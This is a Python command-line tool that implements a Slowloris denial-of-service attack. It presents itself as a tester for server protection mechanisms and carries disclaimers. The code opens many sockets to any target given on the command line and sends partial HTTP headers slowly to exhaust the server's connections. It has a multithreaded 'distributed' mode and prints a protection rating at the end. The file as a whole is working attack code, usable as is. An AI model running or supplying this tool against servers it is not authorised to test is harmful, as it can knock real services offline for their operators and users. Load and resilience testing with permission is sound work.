import socket
import time
import argparse
import threading
import random
import string
from colorama import init, Fore, Style
import sys
from concurrent.futures import ThreadPoolExecutor
import matplotlib.pyplot as plt
import os
from datetime import datetime

# Initialize colorama for colored terminal output
init()

class SlowlorisTest:
    """
    Slowloris attack simulation tool for testing protection mechanisms.
    This is for TESTING ONLY - do not use for malicious purposes.
    """
    
    def __init__(self, target, port=80, connections=150, timeout=5, 
                 sleep_time=15, path="/", https=False, verbose=False):
        self.target = target
        self.port = port
        self.connections = connections
        self.timeout = timeout
        self.sleep_time = sleep_time
        self.path = path
        self.https = https
        self.verbose = verbose
        
        # For tracking test results
        self.connection_count = 0
        self.successful_connections = 0
        self.failed_connections = 0
        self.connection_times = []
        self.active_sockets = []
        self.start_time = None
        self.end_time = None
        self.termination_reason = None
        
        # For tracking connection status over time
        self.status_history = []
        self.status_timestamps = []
        
        print(f"{Fore.YELLOW}SlowlorisTest initialized for {target}:{port}{Style.RESET_ALL}")
        print(f"This tool is for TESTING PURPOSES ONLY to verify protection mechanisms.")
    
    def random_string(self, length=10):
        """Generate a random string for request headers"""
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
    
    def create_socket(self):
        """Create a new socket connection"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target, self.port))
            
            # Send initial HTTP request line
            protocol = "GET" if not self.https else "CONNECT"
            request = f"{protocol} {self.path} HTTP/1.1\r\n"
            request += f"Host: {self.target}\r\n"
            request += f"User-Agent: SlowlorisTestTool/1.0 (Testing Defense Mechanisms)\r\n"
            
            s.send(request.encode())
            return s
        except socket.error as e:
            if self.verbose:
                print(f"{Fore.RED}Error creating connection: {e}{Style.RESET_ALL}")
            return None
    
    def send_partial_header(self, sock):
        """Send a slow, incomplete header to keep connection alive"""
        try:
            header = f"X-SlowTest-{self.random_string()}: {self.random_string(20)}\r\n"
            sock.send(header.encode())
            return True
        except socket.error:
            return False
    
    def record_status(self):
        """Record the current connection status"""
        current_time = time.time() - self.start_time
        current_count = len(self.active_sockets)
        
        self.status_timestamps.append(current_time)
        self.status_history.append(current_count)
        
        if self.verbose:
            print(f"{Fore.CYAN}[{current_time:.1f}s] Active connections: {current_count}{Style.RESET_ALL}")
    
    def run_test(self, duration=60):
        """
        Run the Slowloris test
        
        Args:
            duration: Test duration in seconds
        """
        self.start_time = time.time()
        end_time = self.start_time + duration
        
        print(f"{Fore.GREEN}Starting Slowloris protection test against {self.target}:{self.port}{Style.RESET_ALL}")
        print(f"Target connections: {self.connections}")
        print(f"Test duration: {duration} seconds")
        print(f"Connection sleep time: {self.sleep_time} seconds")
        print(f"Press Ctrl+C to stop the test early")
        
        try:
            # Record initial status
            self.record_status()
            
            # Main test loop
            while time.time() < end_time:
                # Create new connections if needed
                while len(self.active_sockets) < self.connections:
                    start_connect = time.time()
                    sock = self.create_socket()
                    connect_time = time.time() - start_connect
                    
                    if sock:
                        self.active_sockets.append(sock)
                        self.successful_connections += 1
                        self.connection_times.append(connect_time)
                        
                        if self.verbose:
                            print(f"{Fore.GREEN}Connection {len(self.active_sockets)} established ({connect_time:.3f}s){Style.RESET_ALL}")
                    else:
                        self.failed_connections += 1
                    
                    self.connection_count += 1
                    
                    # Small delay between connection attempts to prevent overwhelming local resources
                    time.sleep(0.1)
                
                # Record status periodically
                self.record_status()
                
                # Send partial headers to all connections
                active_count = 0
                for i in range(len(self.active_sockets) - 1, -1, -1):
                    if not self.send_partial_header(self.active_sockets[i]):
                        # Connection closed by server
                        try:
                            self.active_sockets[i].close()
                        except:
                            pass
                        self.active_sockets.pop(i)
                    else:
                        active_count += 1
                
                # Display progress
                elapsed = time.time() - self.start_time
                remaining = end_time - time.time()
                sys.stdout.write(f"\r{Fore.CYAN}Active: {active_count}/{self.connections} | "
                                f"Elapsed: {elapsed:.1f}s | "
                                f"Remaining: {remaining:.1f}s{Style.RESET_ALL}")
                sys.stdout.flush()
                
                # Sleep before next round of requests
                time.sleep(self.sleep_time)
            
            self.termination_reason = "Test completed successfully"
            
        except KeyboardInterrupt:
            self.termination_reason = "Test interrupted by user"
            
        except Exception as e:
            self.termination_reason = f"Test failed with error: {e}"
            
        finally:
            self.end_time = time.time()
            # Close all sockets
            for sock in self.active_sockets:
                try:
                    sock.close()
                except:
                    pass
            
            self.print_results()
            self.generate_charts()
    
    def print_results(self):
        """Print test results"""
        test_duration = self.end_time - self.start_time
        max_connections = max(self.status_history) if self.status_history else 0
        
        print(f"\n\n{Fore.GREEN}===== Slowloris Protection Test Results ====={Style.RESET_ALL}")
        print(f"Target: {self.target}:{self.port}")
        print(f"Test duration: {test_duration:.2f} seconds")
        print(f"Termination reason: {self.termination_reason}")
        print(f"Connection attempts: {self.connection_count}")
        print(f"Successful connections: {self.successful_connections}")
        print(f"Failed connections: {self.failed_connections}")
        print(f"Maximum concurrent connections: {max_connections}")
        
        if self.connection_times:
            avg_time = sum(self.connection_times) / len(self.connection_times)
            print(f"\n{Fore.YELLOW}Connection Time Statistics:{Style.RESET_ALL}")
            print(f"  Average connection time: {avg_time*1000:.2f} ms")
            print(f"  Minimum connection time: {min(self.connection_times)*1000:.2f} ms")
            print(f"  Maximum connection time: {max(self.connection_times)*1000:.2f} ms")
        
        # Defense effectiveness assessment
        if max_connections < 0.5 * self.connections:
            print(f"\n{Fore.GREEN}PROTECTION ASSESSMENT: STRONG{Style.RESET_ALL}")
            print(f"The server effectively limited concurrent connections to less than 50% of the target.")
        elif max_connections < 0.8 * self.connections:
            print(f"\n{Fore.YELLOW}PROTECTION ASSESSMENT: MODERATE{Style.RESET_ALL}")
            print(f"The server limited connections, but allowed up to {max_connections} concurrent connections.")
        else:
            print(f"\n{Fore.RED}PROTECTION ASSESSMENT: WEAK OR NONEXISTENT{Style.RESET_ALL}")
            print(f"The server allowed {max_connections} concurrent slow connections, which could make it vulnerable to Slowloris attacks.")
    
    def generate_charts(self):
        """Generate charts from test results"""
        # Create output directory if it doesn't exist
        os.makedirs('slowloris_test_results', exist_ok=True)
        
        # Generate filename with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename_base = f"slowloris_test_{self.target}_{timestamp}"
        
        # Connection count over time
        if self.status_history:
            plt.figure(figsize=(12, 6))
            plt.plot(self.status_timestamps, self.status_history, '-o', markersize=4)
            plt.title(f'Slowloris Test: Connection Count Over Time - {self.target}:{self.port}')
            plt.xlabel('Time (seconds)')
            plt.ylabel('Active Connections')
            plt.grid(True, alpha=0.3)
            plt.savefig(os.path.join('slowloris_test_results', f"{filename_base}_connections.png"))
        
        # Connection time histogram
        if self.connection_times:
            plt.figure(figsize=(10, 6))
            plt.hist([t*1000 for t in self.connection_times], bins=30, alpha=0.75, color='green')
            plt.title('Connection Time Distribution')
            plt.xlabel('Connection Time (ms)')
            plt.ylabel('Frequency')
            plt.grid(True, alpha=0.3)
            plt.savefig(os.path.join('slowloris_test_results', f"{filename_base}_connection_times.png"))
        
        print(f"{Fore.GREEN}Charts saved to 'slowloris_test_results' directory{Style.RESET_ALL}")

def run_distributed_test(args):
    """Run the test with multiple threads to simulate distributed attack sources"""
    total_connections = args.connections
    thread_count = args.threads
    connections_per_thread = total_connections // thread_count
    
    print(f"{Fore.CYAN}Starting distributed test with {thread_count} threads{Style.RESET_ALL}")
    print(f"Each thread will attempt {connections_per_thread} connections")
    
    # Create a list to store results from each thread
    thread_results = []
    
    def thread_test(thread_id):
        # Create a test instance for this thread
        test = SlowlorisTest(
            target=args.target,
            port=args.port,
            connections=connections_per_thread,
            timeout=args.timeout,
            sleep_time=args.sleep,
            path=args.path,
            https=args.https,
            verbose=args.verbose
        )
        
        # Run the test
        test.run_test(duration=args.duration)
        
        # Return the test instance with results
        return test
    
    # Use a thread pool to run the tests
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = [executor.submit(thread_test, i) for i in range(thread_count)]
        for future in futures:
            try:
                thread_results.append(future.result())
            except Exception as e:
                print(f"{Fore.RED}Thread error: {e}{Style.RESET_ALL}")
    
    # Combine results
    total_connection_attempts = sum(t.connection_count for t in thread_results)
    total_successful = sum(t.successful_connections for t in thread_results)
    total_failed = sum(t.failed_connections for t in thread_results)
    max_connections = sum(max(t.status_history) if t.status_history else 0 for t in thread_results)
    
    print(f"\n{Fore.GREEN}===== Combined Distributed Test Results ====={Style.RESET_ALL}")
    print(f"Target: {args.target}:{args.port}")
    print(f"Test duration: {args.duration} seconds")
    print(f"Total threads: {thread_count}")
    print(f"Connection attempts: {total_connection_attempts}")
    print(f"Successful connections: {total_successful}")
    print(f"Failed connections: {total_failed}")
    print(f"Maximum concurrent connections: {max_connections}")
    
    # Defense effectiveness assessment
    if max_connections < 0.5 * total_connections:
        print(f"\n{Fore.GREEN}PROTECTION ASSESSMENT: STRONG{Style.RESET_ALL}")
        print(f"The server effectively limited concurrent connections to less than 50% of the target.")
    elif max_connections < 0.8 * total_connections:
        print(f"\n{Fore.YELLOW}PROTECTION ASSESSMENT: MODERATE{Style.RESET_ALL}")
        print(f"The server limited connections, but allowed up to {max_connections} concurrent connections.")
    else:
        print(f"\n{Fore.RED}PROTECTION ASSESSMENT: WEAK OR NONEXISTENT{Style.RESET_ALL}")
        print(f"The server allowed {max_connections} concurrent slow connections, which could make it vulnerable to Slowloris attacks.")

def main():
    parser = argparse.ArgumentParser(
        description='Test Slowloris Protection Mechanisms',
        epilog='This tool is for TESTING PURPOSES ONLY to verify protection mechanisms.'
    )
    parser.add_argument('target', help='Target hostname or IP address')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-c', '--connections', type=int, default=150, help='Number of connections to attempt (default: 150)')
    parser.add_argument('-t', '--timeout', type=float, default=5, help='Socket timeout in seconds (default: 5)')
    parser.add_argument('-s', '--sleep', type=float, default=15, help='Seconds to sleep between sending headers (default: 15)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Test duration in seconds (default: 60)')
    parser.add_argument('--path', default='/', help='URL path to request (default: /)')
    parser.add_argument('--https', action='store_true', help='Use HTTPS/SSL')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--threads', type=int, default=1, help='Number of threads for distributed test (default: 1)')
    
    args = parser.parse_args()
    
    print(f"{Fore.YELLOW}" + "="*60 + Style.RESET_ALL)
    print(f"{Fore.YELLOW}DISCLAIMER: This tool is for testing protection mechanisms ONLY.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Using this tool against servers without permission is illegal.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}" + "="*60 + Style.RESET_ALL)
    
    if args.threads > 1:
        run_distributed_test(args)
    else:
        # Create and run the test
        test = SlowlorisTest(
            target=args.target,
            port=args.port,
            connections=args.connections,
            timeout=args.timeout,
            sleep_time=args.sleep,
            path=args.path,
            https=args.https,
            verbose=args.verbose
        )
        
        test.run_test(duration=args.duration)

if __name__ == '__main__':
    main() 